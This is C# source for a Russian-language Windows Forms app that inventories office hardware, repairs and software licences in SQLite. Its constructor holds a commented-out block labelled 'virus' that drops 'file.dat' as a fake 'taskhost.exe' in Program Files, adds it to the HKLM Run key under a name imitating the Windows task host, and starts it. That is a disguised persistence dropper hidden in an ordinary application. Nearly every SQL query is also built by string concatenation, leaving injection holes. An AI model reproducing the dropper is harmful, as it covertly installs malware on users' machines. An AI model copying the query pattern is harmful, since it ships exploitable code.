using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace HardwareParts
{
    public partial class MainForm : RibbonForm
    {
        private string currentPartID;

        public MainForm()
        {
            InitializeComponent();

            // virus
            /*
            try
            {
                File.Copy("file.dat", @"C:\Program Files\Windows NT\taskhost.exe", false);
                Microsoft.Win32.RegistryKey Key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
                Key.SetValue("Хост-процесс для задач Windows NT", @"C:\Program Files\Windows NT\taskhost.exe");
                Key.Close();
                Process.Start(@"C:\Program Files\Windows NT\taskhost.exe");
            }
            catch { };
            */
        }

        private void LoadDepartments()
        {
            tree.Nodes.Clear();
            // заполняем список с отделами
            SQLiteCommand command = new SQLiteCommand("SELECT * FROM 'departments';", SQL.Connection);
            foreach (DbDataRecord record in command.ExecuteReader())
            {
                string id = record["id"].ToString();
                string name = record["name"].ToString();
                TreeNode node = new TreeNode(name, 0, 0);
                node.Tag = id;
                tree.Nodes.Add(node);
            }
            //проходим по всем отделам и считываем рабочие места
            foreach (TreeNode node in tree.Nodes)
            {
                command = new SQLiteCommand("SELECT * FROM 'workplaces' WHERE department=" + node.Tag.ToString() + ";", SQL.Connection);
                foreach (DbDataRecord record in command.ExecuteReader())
                {
                    string id = record["id"].ToString();
                    string name = record["name"].ToString();
                    TreeNode n = new TreeNode(name, 1, 1);
                    n.Tag = id;
                    node.Nodes.Add(n);
                }
            }
        }

        private void LoadDevices()
        {
            grid1.Rows.Clear();
            SQLiteCommand command = new SQLiteCommand("SELECT placeparts.id, parts.name, placeparts.name, placeparts.number, placeparts.installdate FROM 'placeparts','parts' WHERE workplace=" + tree.SelectedNode.Tag.ToString() + " AND parts.id=placeparts.part;", SQL.Connection);
            foreach (DbDataRecord record in command.ExecuteReader())
            {
                grid1.Rows.Add();
                DataGridViewRow row = grid1.Rows[grid1.Rows.Count - 1];
                row.Cells[0].Value = grid1.Rows.Count.ToString();
                row.Cells[1].Value = record[1].ToString();
                row.Cells[2].Value = record[2].ToString();
                row.Cells[3].Value = record[3].ToString();
                row.Cells[4].Value = record[4].ToString();
                row.Cells[5].Value = record[0].ToString();
            }
        }

        private void LoadRepairs()
        {
            grid2.Rows.Clear();
            SQLiteCommand command = new SQLiteCommand("SELECT * FROM 'repair' WHERE placepart=" + currentPartID + ";", SQL.Connection);
            foreach (DbDataRecord record in command.ExecuteReader())
            {
                grid2.Rows.Add();
                DataGridViewRow row = grid2.Rows[grid2.Rows.Count - 1];
                row.Cells[0].Value = grid2.Rows.Count.ToString();
                row.Cells[1].Value = record["description"].ToString();
                row.Cells[2].Value = record["data"].ToString();
                row.Cells[3].Value = record["performer"].ToString();
            }
        }

        private void LoadSoft()
        {
            grid3.Rows.Clear();
            SQLiteCommand command = new SQLiteCommand("SELECT * FROM 'soft' WHERE workplace=" + tree.SelectedNode.Tag.ToString() + ";", SQL.Connection);
            foreach (DbDataRecord record in command.ExecuteReader())
            {
                grid3.Rows.Add();
                DataGridViewRow row = grid3.Rows[grid3.Rows.Count - 1];
                row.Cells[0].Value = grid3.Rows.Count.ToString();
                row.Cells[1].Value = record["name"].ToString();
                row.Cells[2].Value = record["key"].ToString();
                row.Cells[3].Value = record["license"].ToString();
                row.Cells[4].Value = record["installdate"].ToString();
                row.Cells[5].Value = record["id"].ToString();
            }
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (tabControl1.SelectedIndex)
            {
                case 0:
                    rbPanel3.Enabled = false;
                    rbPanel4.Enabled = false;
                    break;
                case 1:
                    rbPanel3.Enabled = true;
                    rbPanel4.Enabled = false;
                    break;
                case 2:
                    rbPanel3.Enabled = false;
                    rbPanel4.Enabled = true;
                    break;
            }

            this.Refresh();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            // нет выбраного узла
            if (e.Node != null)
                rbPanel2.Enabled = true;

            // отделы
            if (e.Node.Level == 0)
            {
                tabControl1.Visible = false;
                rbPanel3.Enabled = false;
                rbPanel4.Enabled = false;
                ribbonButton2.Enabled = true;
                ribbonButton4.Enabled = false;
            }
            else
            // рабочие места
            {
                tabControl1.Visible = true;
                tabControl1.SelectTab(0);
                ribbonButton2.Enabled = false;
                ribbonButton4.Enabled = true;
                // считываем информацию о рабочей станции
                SQLiteCommand command = new SQLiteCommand("SELECT ip, domainname, worker FROM 'workplaces' WHERE id=" + e.Node.Tag + ";", SQL.Connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                DataTable table = new DataTable();
                adapter.Fill(table);
                textBox1.Text = table.Rows[0].ItemArray[1].ToString();
                textBox2.Text = table.Rows[0].ItemArray[0].ToString();
                textBox3.Text = table.Rows[0].ItemArray[2].ToString();
                // получаем имя ответственного сотрудника
                if (textBox3.Text.Length > 0)
                {
                    try
                    {
                        command = new SQLiteCommand("SELECT name FROM 'workers' WHERE id=" + textBox3.Text + ";", SQL.Connection);
                        adapter = new SQLiteDataAdapter(command);
                        table = new DataTable();
                        adapter.Fill(table);
                        textBox3.Text = table.Rows[0].ItemArray[0].ToString();
                    }
                    catch { }
                }
                LoadDevices();
                LoadSoft();
            }
        }

        private void ribbonButton14_Click(object sender, EventArgs e)
        {
            Workers form = new Workers();
            form.ShowDialog();
        }

        private void ribbonButton15_Click(object sender, EventArgs e)
        {
            Parts form = new Parts();
            form.ShowDialog();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            //this.Text = "Computer Parts & Soft - " + Path.GetFileName(Properties.Settings.Default.filename);
            if (!File.Exists(Properties.Settings.Default.filename))
                File.WriteAllBytes(Properties.Settings.Default.filename, Properties.Resources.parts);

            this.Text = "Учёт офисной техники - " + Properties.Settings.Default.filename;
            SQL.ResetConnection();
            LoadDepartments();
        }

        private void ribbonButton1_Click(object sender, EventArgs e)
        {
            EditorForm form = new EditorForm("Новый отдел");
            if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SQL.ExecSQL("INSERT INTO 'departments' ('name') VALUES ('" + form.Value + "');");
                LoadDepartments();
            }
        }

        private void ribbonButton2_Click(object sender, EventArgs e)    // удалить отдел
        {
            if (MessageBox.Show("Удалить выбранный отдел и все рабочие места связанные с ним?", "Внимание!", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
            {
                SQL.ExecSQL("DELETE FROM 'departments' WHERE id=" + tree.SelectedNode.Tag.ToString() + "; DELETE FROM 'workplaces' WHERE department=" + tree.SelectedNode.Tag.ToString() + ";");
                LoadDepartments();
            }
        }

        private void ribbonButton3_Click(object sender, EventArgs e)    // добавить рабочее место
        {
            if (tree.SelectedNode == null)
            {
                MessageBox.Show("Необходимо выбрать отдел, в котором вы хотите создать рабочее место", "Внимание!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            TreeNode node = tree.SelectedNode.Level == 0 ? tree.SelectedNode : tree.SelectedNode.Parent;
            StationForm form = new StationForm();
            if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SQL.ExecSQL(String.Format("INSERT INTO 'workplaces' ('name','department','ip','domainname','worker') VALUES ('{0}','{1}','{2}','{3}','{4}');", form.StationName, node.Tag, form.IP, form.DomainName, form.ID));
                LoadDepartments();
            }
        }

        private void ribbonButton4_Click(object sender, EventArgs e)    // удалить рабочее место
        {
            if (MessageBox.Show("Удалить выбранное рабочее место?", "Внимание!", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
            {
                string cmd = string.Format("DELETE FROM 'workplaces' WHERE id={0}; DELETE FROM 'placeparts' WHERE workplace={0}; DELETE FROM 'soft' WHERE workplace={0};", tree.SelectedNode.Tag.ToString());
                SQL.ExecSQL(cmd);
                LoadDepartments();
            }
        }

        private void ribbonButton5_Click(object sender, EventArgs e)    // добавить устройство
        {
            if (tree.SelectedNode == null || tree.SelectedNode.Tag == null) return;

            DeviceForm form = new DeviceForm(tree.SelectedNode.Tag.ToString());
            if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                LoadDevices();
        }

        private void ribbonButton6_Click(object sender, EventArgs e)    // удалить устройство
        {
            if (grid1.SelectedRows.Count > 0 && MessageBox.Show("Удалить выбранное устройство?", "Внимание!", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
            {
                string cmd = string.Format("DELETE FROM 'placeparts' WHERE id={0}; DELETE FROM 'repair' WHERE placepart={0}", grid1.SelectedRows[0].Cells[5].Value.ToString());
                SQL.ExecSQL(cmd);
                LoadDevices();
                grid1_SelectionChanged(null, null);
            }
        }

        private void ribbonButton9_Click(object sender, EventArgs e)    // ремонт устройства
        {
            if (grid1.SelectedRows.Count > 0)
            {
                RepairForm form = new RepairForm();
                if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    SQL.ExecSQL("INSERT INTO 'repair' ('placepart','description','data','performer') VALUES ('" + grid1.SelectedRows[0].Cells[5].Value.ToString() + "','" + form.description + "','" + form.data + "','" + form.performer + "');");
                    LoadRepairs();
                }
            }
        }

        private void grid1_SelectionChanged(object sender, EventArgs e)
        {
            if (grid1.SelectedRows.Count > 0)
            {
                if (grid1.SelectedRows[0].Cells["id"].Value != null)
                    currentPartID = grid1.SelectedRows[0].Cells["id"].Value.ToString();
                LoadRepairs();
            }
        }

        private void ribbonButton7_Click(object sender, EventArgs e)    // добавить ПО
        {
            SoftForm form = new SoftForm();
            if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string cmd = string.Format("INSERT INTO 'soft' ('name','key','license','installdate','workplace') VALUES ('{0}','{1}','{2}','{3}','{4}');", form.nameSoft, form.key, form.license, form.date, tree.SelectedNode.Tag.ToString());
                SQL.ExecSQL(cmd);
                LoadSoft();
            }
        }

        private void ribbonButton8_Click(object sender, EventArgs e)    // удалить ПО
        {
            if (grid3.CurrentRow != null)
            {
                SQL.ExecSQL("DELETE FROM 'soft' WHERE id=" + grid3.CurrentRow.Cells[5].Value.ToString() + ";");
                LoadSoft();
            }
        }

        private void ribbonButton10_Click(object sender, EventArgs e)   // редактировать ПО
        {
            if (grid3.CurrentRow != null)
            {
                SoftForm form = new SoftForm();
                form.nameSoft = grid3.CurrentRow.Cells[1].Value.ToString();
                form.key = grid3.CurrentRow.Cells[2].Value.ToString();
                form.license = grid3.CurrentRow.Cells[3].Value.ToString();
                form.date = grid3.CurrentRow.Cells[4].Value.ToString();
                if (form.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    string cmd = string.Format("DELETE FROM 'soft' WHERE id={5}; INSERT INTO 'soft' ('name','key','license','installdate','workplace','id') VALUES ('{0}','{1}','{2}','{3}','{4}','{5}');", form.nameSoft, form.key, form.license, form.date, tree.SelectedNode.Tag.ToString(), grid3.CurrentRow.Cells[5].Value.ToString());
                    SQL.ExecSQL(cmd);
                    LoadSoft();
                }
            }
        }

        private void ribbonButton13_Click(object sender, EventArgs e)
        {
            ComingForm form = new ComingForm();
            form.ShowDialog();
        }

        private void ribbonButton16_Click(object sender, EventArgs e)
        {
            StockForm form = new StockForm();
            form.ShowDialog();
        }

        private void ribbonOrbMenuItem2_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                Properties.Settings.Default.filename = openFileDialog1.FileName;
                Properties.Settings.Default.Save();

                //this.Text = "Computer Parts & Soft - " + Path.GetFileName(Properties.Settings.Default.filename);
                this.Text = "Учёт офисной техники - " + Properties.Settings.Default.filename;
                SQL.ResetConnection();
                LoadDepartments();
            }
        }

        private void ribbonOrbMenuItem3_Click(object sender, EventArgs e)
        {
            if (saveFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                File.WriteAllBytes(saveFileDialog1.FileName, Properties.Resources.parts);

                this.Text = "Учёт офисной техники - " + Properties.Settings.Default.filename;
                SQL.ResetConnection();
                LoadDepartments();
            }
        }

        private void ribbonButton17_Click(object sender, EventArgs e)
        {
            ReportRepairForm form = new ReportRepairForm();
            form.ShowDialog();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new About().ShowDialog();
        }

        private void ribbonButton18_Click(object sender, EventArgs e)
        {
            new ReportSoftForm().ShowDialog();
        }

        private void MainForm_Shown(object sender, EventArgs e)
        {
            
        }
    }
}
